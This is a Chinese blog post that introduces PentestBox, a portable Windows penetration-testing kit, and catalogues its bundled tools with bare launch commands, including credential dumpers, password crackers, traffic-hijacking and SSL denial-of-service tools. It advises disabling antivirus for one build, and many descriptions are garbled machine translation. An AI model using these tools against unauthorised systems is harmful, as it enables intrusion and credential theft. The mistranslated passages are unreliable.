-    <published>2016-12-13T12:12:15.000Z</published>
-    <updated>2016-12-13T12:15:45.983Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="0x01-Pentest-BOX"><a href="#0x01-Pentest-BOX" class="headerlink" title="0x01 Pentest BOX"></a>0x01 Pentest BOX</h3><p>Pentest Box：渗透测试盒子,是一款Windows平台下预配置的便携式开源渗透测试环境，而它也是著名黑客Kapustkiy常用的工具之一。这里集成的大都是Linux下的工具,Kali Linux上面的常用的很多工具这里面也都集成了。<br>它打包了所有的安全工具，并且可以在Windows系统中原生地运行，有效地降低了对虚拟机或者双启动环境的需求。<br>PentestBox官网：<a href="https://pentestbox.org/zh/" target="_blank" rel="external">https://pentestbox.org/zh/</a></p>
-<h3 id="0x02-Pentest-BOX特性"><a href="#0x02-Pentest-BOX特性" class="headerlink" title="0x02 Pentest BOX特性"></a>0x02 Pentest BOX特性</h3><blockquote>
-<p>易于使用<br>设计简洁<a id="more"></a><br>性能卓越<br>没有依赖需求<br>方便携带<br>Linux 工具集<br>无驱动问题<br>模块化<br>更少的内存占用<br>更少的磁盘占用<br>内置浏览器<br>可更新特性<br>易于分享<br>32位系统支持</p>
-</blockquote>
-<h3 id="0x03-Pentest-BOX安装"><a href="#0x03-Pentest-BOX安装" class="headerlink" title="0x03 Pentest BOX安装"></a>0x03 Pentest BOX安装</h3><p>下载地址：<a href="https://pentestbox.org/zh/#download" target="_blank" rel="external">https://pentestbox.org/zh/#download</a><br><img src="http://p1.bpimg.com/567571/d99550f4c0d99413.png" alt=""><br>我们可以有两种选择，一款安装了 Metasploit，另一款没有安装。在安装和使用“安装有 Metasploit 的 PentestBox” 时请关闭杀毒软件和防火墙。默认释放安装在 C:/PentestBox/。<br>直接运行 文件 选择安装的文件位置路径，即可安装，安装其实就是文件的释放，最后整个文件夹大小为4.55GB左右。<br>还可以直接 把PentestBox安装在移动硬盘或者 U盘中，这样就打造了移动渗透工具的平台了，在任意的windows系统上运行，这就比Kali 的Live U盘要方便许多。</p>
-<h3 id="0x04-Pentest-BOX基本文件结构"><a href="#0x04-Pentest-BOX基本文件结构" class="headerlink" title="0x04 Pentest BOX基本文件结构"></a>0x04 Pentest BOX基本文件结构</h3><p>PentestBox共5个文件夹,2个库文件，一个bat批处理和一个exe启动程序。bat和exe都可以启动PentestBox<br><img src="http://p1.bqimg.com/567571/2d40b9294cb05f5c.png" alt=""></p>
-<blockquote>
-<p>base文件夹：里面放了一些工具需要用到的环境变量文件，如：python 、jdk等</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/38a2aee2799bb778.png" alt=""></p>
-<blockquote>
-<p>bin文件夹：里面的工具基本上足够满足日常的渗透测试要求了</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/5dcdd7f5cbccde27.png" alt=""><br><img src="http://p1.bqimg.com/567571/13b5e60d9c5a513b.png" alt=""></p>
-<h3 id="0x05-Pentest-BOX基本操作"><a href="#0x05-Pentest-BOX基本操作" class="headerlink" title="0x05 Pentest BOX基本操作"></a>0x05 Pentest BOX基本操作</h3><p>5.1 toolsmanager<br>打开工具管理器，在这里可以 安装/升级/卸载  软件<br>5.2 Update all installed Modules<br>更新已经安装的工具<br>5.3 uninstall + 软件名<br>在toolsmanager 的软件目录里面 我们现在想卸载已经安装过的软件的话，直接键入uninstall + 软件名</p>
-<h3 id="0x06-Pentest-BOX常用工具"><a href="#0x06-Pentest-BOX常用工具" class="headerlink" title="0x06 Pentest BOX常用工具"></a>0x06 Pentest BOX常用工具</h3><p>6.1 Web漏洞扫描器<br><strong>Burp Suite</strong>  是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。<br>所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;burpsuite
-</code></pre><p><strong>Commix</strong>  有一个简单的环境,它可以被使用,从web开发人员,渗透测试人员甚至安全研究人员测试web应用程序的视图找到错误,错误或漏洞相关命令注入攻击。    </p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;commix
-</code></pre><p><strong>dotdotpwn</strong> 这是一个非常灵活的智能fuzzer发现遍历目录等软件的漏洞HTTP / FTP / TFTP服务器,网络平台如cms,erp,博客,等等。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;dotdotpwn
-</code></pre><p><strong>fimap</strong>  fimap有点python工具可以找到,准备、审计、利用甚至谷歌自动在webapps本地和远程文件包含漏洞。fimap应该像sqlmap LFI / RFI代替sql注入漏洞。这是目前正在发展但它是可用的。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;fimap
-</code></pre><p><strong>Golismero</strong>  GoLismero安全性测试的是一个开源框架。这是目前针对网络安全,但它可以很容易地扩展到其他类型的扫描。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;golismero
-</code></pre><p><strong>jSQL</strong>  jSQL注入是一个轻量级应用程序用于查找数据库信息从一个遥远的服务器。jSQL是免费的,开放源码和跨平台(Windows、Linux、Mac OS X、Solaris)。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;jSQL
-</code></pre><p><strong>Nikto</strong>  Nikto是一个开源的web服务器(GPL)扫描仪对web服务器执行全面测试多个项目,包括超过6700个有潜在危险的文件/程序,检查超过1250台服务器的过时的版本,和版本超过270服务器上的具体问题。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;nikto
-</code></pre><p><strong>PadBuster</strong>  自动化脚本执行Padding Oracle的攻击。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;padbuster
-</code></pre><p><strong>SqlMap</strong>  sqlmap是一个开源的渗透测试工具,自动检测和利用SQL注入漏洞的过程和接管的数据库服务器。它有一个强大的检测引擎,许多细分功能的最终渗透试验器和广泛的开关持续指纹数据库,从数据库获取数据,访问底层文件系统和操作系统上执行命令通过带外连接。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;sqlmap
-</code></pre><p><strong>Vega</strong> – Vega 是一个免费和开源的扫描仪和测试平台,测试web应用程序的安全。织女星可以帮助你找到并验证SQL注入、跨站脚本(XSS),不经意间透露敏感信息,和其他漏洞。它是用Java编写的,基于GUI的,运行在Linux上,OS X和窗户。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;vega
-</code></pre><p><strong>Wpscan</strong>—–WPScan是一个黑盒WordPress漏洞扫描器,可以用来扫描远程WordPress安装发现安全问题。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;wpscan
-</code></pre><p><strong>Yasuo</strong> – Yasuo是一个ruby脚本扫描脆弱的第三方web应用程序。工作时在网络安全评估(内部、外部redteam演出等),我们经常碰到脆弱的第三方web应用程序或web前端,让我们妥协远程服务器利用公开已知的漏洞。一些常见的和最喜欢的Apache Tomcat应用程序管理界面,JBoss jmx控制台</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;yasuo
-</code></pre><p><strong>Zaproxy</strong>– OWASP Zed攻击代理(攻击)是一个易于使用的综合渗透测试工具在web应用程序中寻找漏洞。是设计用于与广泛的安全经验的人,因此是理想的开发和功能测试人员是渗透测试作为一个有用的补充有经验的笔测试人员工具箱。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;zap
-</code></pre><p>6.2 Web应用程序代理</p>
-<p><strong>Burp Suite</strong> – Burp Suite是一个集成的平台进行安全性测试的web应用程序。它的各种工具无缝地协同工作,以支持整个测试过程,从最初的映射和分析应用程序的攻击表面,通过寻找和利用安全漏洞。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;burpsuite
-</code></pre><p><strong>Zaproxy</strong>- OWASP Zed攻击代理(攻击)是一个易于使用的综合渗透测试工具在web应用程序中寻找漏洞。是设计用于与广泛的安全经验的人,因此是理想的开发和功能测试人员是渗透测试作为一个有用的补充有经验的笔测试人员工具箱。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;zap
-</code></pre><p>6.3 CMS漏洞扫描器</p>
-<p><strong>CMSmap</strong>——CMSmap python开源CMS扫描,自动检测安全漏洞的过程中最受欢迎的CMS。CMSmap的主要目的是为不同类型的cms集成常见漏洞在一个单一的工具。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;cmsmap
-</code></pre><p><strong>droopescan</strong>——基于插件的扫描仪，帮助安全研究人员识别问题<br>Drupal。<br>SilverStripe<br>Wordpress</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;droopescan
-</code></pre><p><strong>OWASP</strong> Joomla漏洞扫描器——Joomla！ 它可能是最广泛使用的CMS，由于其灵活性，用户友好性，可扩展性命名一些。因此，观察其漏洞，并添加像KB这样的漏洞到Joomla扫描器需要持续的活动。它将帮助Web开发人员和Web 大师帮助识别他们部署的Joomla可能的安全弱点！ 网站。 没有Web安全扫描程序仅专用于一个CMS。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;joomscan
-</code></pre><p><strong>Wpscan</strong>———–WPScan是一个黑盒WordPress漏洞扫描器,可以用来扫描远程WordPress安装发现安全问题。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;wpscan
-</code></pre><p><strong>VbScan</strong>——VBScan perl编程语言是一个开源项目的检测链入页面CMS漏洞和分析。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;vbscan
-</code></pre><p>6.4 网络爬虫程序</p>
-<p><strong>DirBuster</strong>——DirBuster是一个多线程java应用程序，旨在强制在Web /应用程序服务器上强制目录和文件名。<br>作者:OWASP.org<br>许可:Apache 2.0</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;dirbuster
-</code></pre><p><strong>Burp Suite</strong> ——Burp Suite 是一个集成的平台进行安全性测试的web应用程序。它的各种工具无缝地协同工作,以支持整个测试过程,从最初的映射和分析应用程序的攻击表面,通过寻找和利用安全漏洞。<br>作者:Portswigger</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;burpsuite
-</code></pre><p>6.5 信息收集</p>
-<p><strong>Angry IP Scanner</strong> -Angry IP Scanner (或者只是ipscan)是一个开源和跨平台的网络扫描器设计为快速和易于使用。它扫描IP地址和端口,以及许多其他功能。人们普遍使用的网络管理员,只是好奇的世界各地的用户,包括大型和小型企业、银行和政府机构。</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;ipscan
-</code></pre><p><strong>dnsrecon</strong>– DNS枚举脚本<br>许可:GPLv2</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;dnsrecon
-</code></pre><p><strong>Golismero</strong>——GoLismero安全性测试的是一个开源框架。这是目前针对网络安全,但它可以很容易地扩展到其他类型的扫描。<br>许可:GPLv2</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;golismero
-</code></pre><p><strong>Instarecon</strong>自动化的基本数字侦察。伟大的目标获得最初的足迹,发现额外的子域。InstaRecon会做的事:<br>DNS(直接、PTR MX,NS)查找<br>域名查询服务(域和IP)查找<br>谷歌在搜索的子域狗屁不是<br>Shodan查找<br>在整个cidr反向DNS查找<br>许可:麻省理工学院的许可</p>
-<pre><code>C:\Users\Demon\Desktop
-&gt;instarecon
-</code></pre><p><strong>Nmap</strong>-Nmap(“网络映射器”)是一个免费和开源(许可证)实用程序用于网络发现和安全审计。许多系统和网络管理员也发现它有用的任务,比如网络库存,管理服务升级计划,和监控主机或服务正常运行时间。Nmap使用原始IP数据包在小说方面来确定网络上的主机可用,哪些服务(应用程序名称和版本)提供这些主机,操作系统(OS版本)他们正在运行,什么类型的数据包过滤器/防火墙正在使用,和几十个其他的特征。它旨在快速扫描大型网络,但对单一主机工作正常。Nmap运行在所有主要的电脑操作系统,和官方二进制包可供Linux,Windows,和Mac OS x除了经典Nmap命令行可执行文件,Nmap套件包括一个先进的GUI和结果查看器(Zenmap),一个灵活的数据传输,重定向,和调试工具(Ncat),比较扫描结果的一个实用程序(Ndiff)和数据包生成和响应分析工具(np)。<br>许可:GPLv2</p>
-<p>为了使用Nmap，你需要首先安装WinPcap包捕获库，可以从Winpcap.org下载。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;nmap
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;ncat
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;ndiff
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;nping
-</code></pre><p><strong>Responder</strong> –Responder 是一个LLMNR NBT-NS和mdn投毒者,内置HTTP / SMB /该软件/ FTP / LDAP流氓身份验证服务器支持NTLMv1 / NTLMv2 / LMv2,延长安全NTLMSSP和HTTP基本身份验证。<br>作者:SpiderLabs<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;responder
-</code></pre><p><strong>SnmpWalk</strong>——SnmpWalk允许你检测一组变量可用于某一设备上阅读。你可以获得一个完整的列表或部分。通过分析网络设备扫描获得的结果使用SnmpWalk可以开发一个支持的mib列表,通过这种方式,获得完整的描述变量和可能的值。<br>作者:SnmpSoft公司</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;snmpwalk
-</code></pre><p><strong>SpiderFoot</strong>——SpiderFoot是一个开源情报自动化工具。它的目标是实现自动化的过程对给定目标收集情报,这可能是一个IP地址,域名、主机名或网络子网。SpiderFoot可以用来进攻,即作为黑盒的一部分渗透测试收集的信息目标或防守来识别你的组织是免费提供什么信息对你攻击者使用。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;spiderfoot
-</code></pre><p><strong>TestSSLServer</strong>——TestSSLServer是一个简单的命令行工具,联系一个SSL / TLS服务器(名称和端口给出参数),获得一些信息。<br>作者:托马斯Pornin</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;testsslserver
-</code></pre><p><strong>SSlStrip</strong>——它将透明地劫持HTTP交通网络上,注意HTTPS连接和重定向,然后这些链接映射到类似的HTTP链接或homograph-similar HTTPS连接。它还支持模式提供一个看起来像一个锁图标标识,选择性伐木、否认和会话。<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;sslstrip
-</code></pre><p><strong>SSLyze</strong>——SSLyze是一个Python工具,可以分析一个服务器的SSL配置连接到它。设计为快速和全面的,应该帮助组织和测试人员识别SSL服务器配置错误影响他们。<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;sslyze
-</code></pre><p><strong>SSLScan</strong>——SSLScan测试SSL / TLS启用服务发现支持密码套件。<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;sslscan
-</code></pre><p><strong>Sublist3r</strong>——Sublist3r是python工具,旨在列举子域的网站使用搜索引擎。它有助于渗透测试和bug猎人收集和收集他们的目标域的子域。Sublist3r目前支持以下搜索引擎:谷歌,雅虎,必应,百度,问。更多的搜索引擎可能被添加在未来。使用Netcraft和DNSdumpster Sublist3r也收集子域。<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;sublist3r
-</code></pre><p><strong>Subbrute</strong>SubBrute是一个社区驱动的项目的目标创造最快的和最精确的子域名枚举的工具。背后的一些魔法SubBrute是它使用解析器作为一种开放代理绕过DNS病原。这个设计还提供了一层匿名,SubBrute不直接发送交通目标的名字服务器。<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;subbrute
-</code></pre><p><strong>Tekdefense</strong>-Automater-自动化是一个URL /域名,IP地址和Md5 hash OSINT工具旨在使分析过程更容易入侵分析师。给定一个目标(URL、IP或散列)或一个文件全自动化目标将返回相关的结果来源如下:IPvoid.com,Robtex.com,Fortiguard.com,unshorten。我,Urlvoid.com,Labs.alienvault.com,ThreatExpert VxVault,VirusTotal。<br>作者:TekDefense.com</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;automater
-</code></pre><p><strong>UrlCrazy</strong>——生成和测试域输入错误和变化检测和执行错误蹲,URL劫持,钓鱼,和企业间谍活动。</p>
-<p>许可:非商业性</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;urlcrazy
-</code></pre><p><strong>The Harvester</strong> ——The Harvester 电子邮件帐户,子域名名称、虚拟主机、开放端口/横幅,和员工的名字从不同的公共资源(搜索引擎,pgp关键服务器)。<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;theharvester
-</code></pre><p><strong>Wireshark</strong>——Wireshark是世界上最重要的网络协议分析仪。它让你看到发生了什么在您的网络在微观水平。这是事实上的标准(通常法理)在许多行业和教育机构。Wireshark发展繁荣的贡献全球网络专家。<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;wireshark
-</code></pre><p>6.6 开发工具</p>
-<p><strong>Beef Project</strong>——beef是浏览器开发框架。这是一个渗透测试工具,它关注的是web浏览器。<br>作者:Wade Alcorn<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;beefproject
-</code></pre><p><strong>CrackMapExec</strong>-其中的瑞士军刀Windows /活动目录环境。<br>多亏了托马斯。编译的版本。<br>作者:byt3bl33d3r</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;crackmapexec
-</code></pre><p><strong>Metasploit</strong> Framework——世界上最好用渗透测试框架。<br>作者:Rapid7<br>许可:BSD 3条款许可协议<br>请注意PentestBox的有两个版本,一个与Metasploit Metasploit和另一个。如果没有完成下载Metasploit变体在这里。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;msfvenom
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;msfelfscan
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;msfbinscan
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;msfpescan
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;msfd
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;msfmachscan
-</code></pre><p><strong>SqlMap</strong>——sqlmap是一个开源的渗透测试工具,自动检测和利用SQL注入漏洞的过程和接管的数据库服务器。它有一个强大的检测引擎,许多细分功能的最终渗透试验器和广泛的开关持续指纹数据库,从数据库获取数据,访问底层文件系统和操作系统上执行命令通过带外连接。<br>作者:Miroslav Stampar Bernardo Damele Assumpcao吉马良斯<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-</code></pre><p>6.7 密码破解<br><strong>Burp Suite</strong>——Burp Suite是一个集成的平台进行安全性测试的web应用程序。它的各种工具无缝地协同工作,以支持整个测试过程,从最初的映射和分析应用程序的攻击表面,通过寻找和利用安全漏洞。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;burpsuite
-</code></pre><p><strong>Findmyhash</strong>——findmyhash。py尝试不同类型的裂缝散列使用免费的在线服务。<br>作者:JulGor<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;findmyhash
-</code></pre><p><strong>HashIdentifier</strong>——软件来识别不同类型的散列加密数据,尤其是密码使用。<br>作者:Zion3R<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;hashidentifier
-</code></pre><p><strong>Hashcat</strong>——Hashcat是世界上最快的CPU-based密码恢复工具。<br>许可证</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;hashcat-cli32
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;hashcat-cli64
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;hashcat-cliXOP
-</code></pre><p><strong>LaZagne</strong>——LaZagne项目是一个开放源码应用程序用于检索大量的密码存储在本地计算机。每个软件存储密码使用不同的技术(明文、api、自定义算法、数据库等)。这个工具已经开发为目的的找到这些密码为最常用的软件。这时,它支持22个项目在使用微软的Windows操作系统和12在Linux /类unix操作系统。<br>作者:AlessandroZ<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;lazagne
-</code></pre><p><strong>John the Ripper</strong>——John the Ripper是一个快速密码饼干,目前对于许多风格的Unix,窗户,DOS,BeOS和OpenVMS。它的主要目的是检测弱Unix密码。除了在各种Unix系统上最常见的几种crypt（3）密码哈希类型，支持开箱即用的是Windows LM hash，以及社区增强版本中的大量其他哈希和密码。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;johntheripper
-</code></pre><p><strong>Patator</strong>——Patator是出于对使用Hydra，Medusa，Ncrack，Metasploit模块和Nmap NSE脚本的密码猜测攻击的挫折。 我选择了不同的方法，以便不创建另一个暴力的工具，并避免重复相同的缺点。 Patator是一个用Python编写的多线程工具，力求比其他前辈更可靠和更灵活。<br>作者:Sebastien MACKE<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;patator
-</code></pre><p><strong>RainbowCrack</strong>——RainbowCrack是Philippe Oechslin更快的时间存储器权衡技术的一般建议实现。 它裂纹散列与彩虹表.RainbowCrack使用时间内存权衡算法来破解哈希。 它不同于强力哈希饼干。强力哈希饼干生成所有可能的明文，并在飞行中计算相应的哈希，然后将哈希与要破解的哈希进行比较。 一旦找到匹配，找到明文。 如果所有可能的明文都被测试并且没有找到匹配，则找不到明文。 利用这种类型的散列破解，丢弃所有中间计算结果。<br>作者:RainbowCrack项目</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;rcrack
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;rt2rtc
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;rtgen
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;rtsort
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;rcrack_cl
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;rcrack_cl_gui
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;rcrack_cuda
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;rcrack_cuda_gui
-</code></pre><p><strong>THC Hydra</strong>– Hydra是一个并行登录饼干支持众多的协议攻击。非常快和灵活,很容易添加新的模块。这个工具可以让研究人员和安全顾问展示将是多么容易获得未授权访问远程系统。<br>请注意,PentestBox包含编译的版本THC-Hydra来自在这里.<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;hydra
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;pw-inspector
-</code></pre><p><strong>Zaproxy</strong>– OWASP Zed攻击代理(攻击)是一个易于使用的综合渗透测试工具在web应用程序中寻找漏洞。是设计用于与广泛的安全经验的人,因此是理想的开发和功能测试人员是渗透测试作为一个有用的补充有经验的笔测试人员工具箱。<br>作者:Simon Bennetts</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;zap
-</code></pre><p>6.8 安卓系统安全</p>
-<p><strong>AndroBugs Framework</strong> -—AndroBugs Android脆弱性分析框架是一个系统,有助于开发人员或黑客在Android应用程序找到潜在的安全漏洞。没有灿烂的GUI界面,但最有效的(平均每扫描不到2分钟)和更准确。<br>作者:AndroBugs<br>作者:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;androbugs
-</code></pre><p>Androguard逆向工程,恶意软件和goodware Android应用程序的分析……和更多(忍者!)<br>作者: Anthony Desnos<br>许可:Apache版本2.0</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;androapkinfo
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;androarsc
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;androauto
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;androaxml
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;androcsign
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;androdd
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;androdiff
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;androdis
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;androgui
-</code></pre><p><strong>Androwarn</strong>——Androwarn是一个工具,它的主要目的是对潜在的恶意行为检测和警告用户开发的Android应用程序。<br>作者: Thomas D<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;androwarn
-</code></pre><p><strong>ApkTool</strong>逆向工程第三方的工具,关闭,二进制Android应用程序。它可以解码资源接近原始形式和重建后做一些修改,这使得有可能逐步调试smali代码。还使用一个应用程序就会变得容易些,因为项目的文件结构和自动化等重复性的任务构建apk,等等。<br>作者:Connor Tumbleson, Ryszard Wiśniewski<br>许可:Apache版本</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;apktool
-</code></pre><p><strong>ByteCode Viewer</strong> ——反向工程第三方，封闭，二进制Android应用程序的工具。 它可以将资源解码为几乎原始的形式，并在做出一些修改后重建它们; 它使得可以一步一步地调试smali代码。 此外，它使一个应用程序的工作更容易，因为像项目一样的文件结构和自动化一些重复的任务，如构建apk等。<br>作者:konloch<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;bytecodeviewer
-</code></pre><p><strong>dex2jar</strong>——转换。dex文件。类文件(压缩jar)<br>作者:鲍勃·潘<br>许可:Apache版本</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;d2j-dex2jar
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;d2j-dex2smali
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;d2j-jar2dex
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;d2j-decrypt-string
-</code></pre><p><strong>Jad</strong>x——敏捷的Java编译器<br>作者:skylot<br>许可:Apache</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;jadx
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;jadx-gui
-</code></pre><p><strong>JD-GUI</strong>——JD-GUI是一个独立的图形工具显示的Java源代码”。阶级”文件。你可以浏览重建源代码JD-GUI即时访问方法和字段。<br>许可:免费非商业用途</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;jd-gui
-</code></pre><p><strong>Pidca</strong>t——彩色logcat脚本,只显示了一个特定的应用程序包的日志条目。<br>作者 Jake Wharton</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;pidcat
-</code></pre><p>6.9 逆向工程<br><strong>ApkTool</strong>—-逆向工程第三方的工具,关闭,二进制Android应用程序。它可以解码资源接近原始形式和重建后做一些修改,这使得有可能逐步调试smali代码。还使用一个应用程序就会变得容易些,因为项目的文件结构和自动化等重复性的任务构建apk,等等。<br>作者:Connor Tumbleson, Ryszard Wiśniewski<br>许可:Apache版本</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;apktool
-</code></pre><p><strong>dex2jar</strong>——转换。dex文件。类文件(压缩jar)<br>作者:Bob Pan<br>许可:Apache版本</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;d2j-dex2jar
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;d2j-dex2smali
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;d2j-jar2dex
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;d2j-decrypt-string
-</code></pre><p><strong>Jad</strong> —— Jad provides提供了一个命令行用户界面从类文件中提取源代码。<br>作者: Pavel Kouznetsov</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;jad
-</code></pre><p><strong>JD-GUI</strong>——JD-GUI是一个独立的图形工具显示的Java源代码”。阶级”文件。你可以浏览重建源代码JD-GUI即时访问方法和字段。<br>许可:免费非商业用途</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;jd-gui
-</code></pre><p><strong>JavaSnoop</strong>——JavaSnoop是安全工具,它允许一个方面安全测试人员轻松地测试Java应用程序的安全。<br>作者:www.aspectsecurity.com<br>许可:GPLv3</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-</code></pre><p><strong>OllyDbg</strong>——OllyDbg 32位汇编级别分析调试器为Microsoft®Windows®<br>作者:Oleh pokalchuk Yuschuk</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;ollydbg
-</code></pre><p><strong>Radare2</strong>——r2是从头开始的重写，以提供一组库和工具来处理二进制文件.Radare项目作为取证工具启动，脚本命令行十六进制编辑器能够打开磁盘文件，但后来支持分析二进制文件， 反汇编代码，调试程序，附加到远程gdb服务器。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;radare2
-</code></pre><p>打开网络服务器,请遵循下面。</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;radare2directory
-
-C:\PentestBox\bin\ReverseEngineering\radare2
-$radare2.exe - c = H rax2.exe
-</code></pre><p><strong>Smali/Baksmali </strong>-=smali / baksmali是dalvik使用的dex格式的汇编/反汇编器，Android的Java VM实现。 语法是松散地基于Jasmin的/ dedexer的语法，并支持dex格式的完整功能（注释，调试信息，行信息等）。您可以通过键入smali和baksmali访问smali和baksmali<br>许可:BSD</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
-&gt;smali
-
-cmd.exe
-C:\Users\Demon\Desktop
-&gt;baksmali
-</code></pre><p>6.10 压力测试</p>
-<p><strong>THC-SSL-DOS</strong>——THC-SSL-DOS工具是一个概念证明披露可疑SSL的安全工具。这工作好如果服务器支持SSL重新谈判。它仍然工作如果不支持SSL重新谈判,但之前需要一些修改和更多的机器人可以看到产生影响。<br>许可:GPLv2</p>
-<pre><code>cmd.exe
-C:\Users\Demon\Desktop
